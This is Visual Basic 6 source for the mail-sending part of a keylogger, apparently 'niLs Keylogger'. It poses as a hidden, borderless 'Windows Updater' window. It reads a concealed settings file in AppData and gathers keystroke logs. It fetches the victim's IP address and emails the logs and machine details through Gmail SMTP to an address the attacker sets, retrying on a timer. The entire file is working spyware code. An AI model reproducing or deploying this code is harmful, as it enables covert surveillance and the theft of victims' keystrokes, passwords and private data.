VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Windows Updater"
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   Icon            =   "SendMail.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1440
      Top             =   0
   End
   Begin VB.FileListBox File1 
      Height          =   4185
      Left            =   5040
      Pattern         =   "*.nkl"
      TabIndex        =   1
      Top             =   240
      Width           =   1935
   End
   Begin VB.TextBox txtSendThis 
      Height          =   4095
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   360
      Width           =   4815
   End
   Begin VB.Label lblSec 
      Caption         =   "0"
      Height          =   255
      Left            =   240
      TabIndex        =   2
      Top             =   0
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit

'Get IP
Private Declare Function URLDownloadToFile Lib "urlmon" _
   Alias "URLDownloadToFileA" _
  (ByVal pCaller As Long, _
   ByVal szURL As String, _
   ByVal szFileName As String, _
   ByVal dwReserved As Long, _
   ByVal lpfnCB As Long) As Long
   
Private Const ERROR_SUCCESS As Long = 0
Private Const BINDF_GETNEWESTVERSION As Long = &H10
Private Const INTERNET_FLAG_RELOAD As Long = &H80000000
Dim MyIP As String

'Special Folde Path
Public Enum mceIDLPaths
    CSIDL_APPDATA = &H1A 'C:\WINNT\Profiles\username\Application Data.
End Enum
Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean

Public Lpath, sendTo, sendFrom, FromPWD, FromPC As String


Private Sub Form_Load()
Me.Left = Screen.Width - Me.Width
Me.Top = Screen.Height - Me.Height
LoadSetting
End Sub
Private Sub LoadSetting()

Lpath = ""
Dim RetryTime, LogPWD As String

If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") <> "" Then 'setting file found then
    
    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") For Input As 1
    Input #1, Lpath, LogPWD, FromPC, sendTo, sendFrom, FromPWD, RetryTime
    Close #1
    
If LCase(sendTo) = "none" Then End

If Left(Lpath, 2) = "u:" Then Lpath = Environ$("USERPROFILE") & Mid(Lpath, 3, Len(Lpath) - 2)

File1.Path = Lpath  'here Lpath=LogDirectory path
Timer1.Interval = 1000 * RetryTime
LoadLogtoSend   'Move to Log sending process

Else    'setting not found
    'MsgBox "Settings not found", , "Error"
    End
End If

End Sub
Private Sub LoadLogtoSend()
File1.Refresh

If File1.ListCount < 2 Then End    'no log or Only one log(current) send it next time

File1.ListIndex = 0 'Choose first log which will be oldest

Lpath = File1.Path & "\" & File1.FileName

Dim NoNeed, lTime, lDate, CompDesc, lPwd, AppRevision As String

'Read initials
Open Lpath For Input As 1
Input #1, NoNeed, lTime, lDate, CompDesc, lPwd, AppRevision
Close #1

Call GetMyIP
txtSendThis = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.com" & Chr(34) & ">niLs Keylogger</a></b><br>"
txtSendThis = txtSendThis & "<b>Machine Description: </b>" & Encrypt(CompDesc, -25) & "<br>"
txtSendThis = txtSendThis & "<b>Machine IP: </b> " & MyIP & "<br>"
txtSendThis = txtSendThis & "<b>Date: </b>" & lDate & "<br>"
txtSendThis = txtSendThis & "<b>Start Time: </b>" & lTime & "<br>"
txtSendThis = txtSendThis & "<b>End Time: </b>" & FileDateTime(Lpath) & "<br>"
txtSendThis = txtSendThis & "<b>AppVersion: </b>" & Encrypt(AppRevision, -20) & "<br>"

If lPwd <> "" Then  'Skip the Read Log Stage, Log is password protected.
txtSendThis = txtSendThis & "<b>Password to Open :</B>" & Left(lPwd, 2) & "****<br>Download Attached KeyLog."
Call SendEmail
Else
txtSendThis = txtSendThis & "______________________<br><br>"
Call ReadLog
End If
End Sub
Private Sub ReadLog()

'Read Log & add to txtSendThis
Dim sTemp As String
Open Lpath For Input As 2
      While Not EOF(2)
        Line Input #2, sTemp
        If Left(sTemp, 2) <> Chr(34) & Chr(155) Then
            txtSendThis = txtSendThis & sTemp & "<br>"
        End If
      Wend
Close #2

Call SendEmail
End Sub
Sub SendEmail()


Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields

' send one copy with Google SMTP server (with autentication)
schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = 465
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = sendFrom '"yourID@gmail.com"
Flds.Item(schema & "sendpassword") = FromPWD '"myPassword"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update

On Error GoTo Err2

With iMsg
    .To = sendTo '"anyone@anything.com"
    .From = sendFrom '"yourID@gmail.com"
    .Subject = "niLsKLG-" & FromPC & "(" & MyIP & ")"
 '   .TextBody = txtSendThis.Text
    .HTMLBody = txtSendThis.Text   ' Use it to add HTML codes to email
    .AddAttachment Lpath
Set .Configuration = iConf
.Send
End With

Set iMsg = Nothing
Set iConf = Nothing
Set Flds = Nothing

'If Email Sent change the name of file So it will not resent
Name Lpath As Left(Lpath, Len(Lpath) - 3) & "sent"

'send Next log
Call LoadLogtoSend


Err2:
'Email not sent Retry
If Err.Number <> 0 Then
    If Timer1.Interval = 0 Then End
    If Err.Number = -2147220973 Then
    Timer1.Enabled = True  'PC might not be connected Retry after Sometim.
    Else
    'MsgBox Err.Description: 'Password, Username or any setting might be wrong
    End
    End If
End If

End Sub

Private Sub Timer1_Timer()
lblSec.Caption = lblSec.Caption + 1
If lblSec.Caption = 60 Then lblSec.Caption = 0: Call SendEmail
End Sub

Private Function Encrypt(ByVal ThisText As String, encCode As Integer) As String
Dim i As Integer
For i = 1 To Len(ThisText)
Encrypt = Encrypt & Chr(Asc(Mid(ThisText, i, 1)) + encCode)
Next i
End Function
Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String

Dim Ret As Long
Dim Trash As String: Trash = Space$(260)

    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
     
    GetSpecialFolderA = Trash
    

End Function
Private Sub GetMyIP()

Dim sSourceUrl, sLocalFile As String
sLocalFile = File1.Path & "\IP.txt"
sSourceUrl = "http://whatismyip.org/"
If DownloadFile(sSourceUrl, sLocalFile) Then
      
'my way works for "http://whatismyip.org/" only
      Dim strIP As String
      Open sLocalFile For Input As 1
      Input #1, strIP
      Close #1
    MyIP = strIP
    
End If

Kill sLocalFile

End Sub

Public Function DownloadFile(ByVal sSourceUrl As String, _
                             sLocalFile As String) As Boolean
  
  'Download the file. BINDF_GETNEWESTVERSION forces
  'the API to download from the specified source.
  'Passing 0& as dwReserved causes the locally-cached
  'copy to be downloaded, if available. If the API
  'returns ERROR_SUCCESS (0), DownloadFile returns True.
   DownloadFile = URLDownloadToFile(0&, _
                                    sSourceUrl, _
                                    sLocalFile, _
                                    BINDF_GETNEWESTVERSION, _
                                    0&) = ERROR_SUCCESS
   
End Function

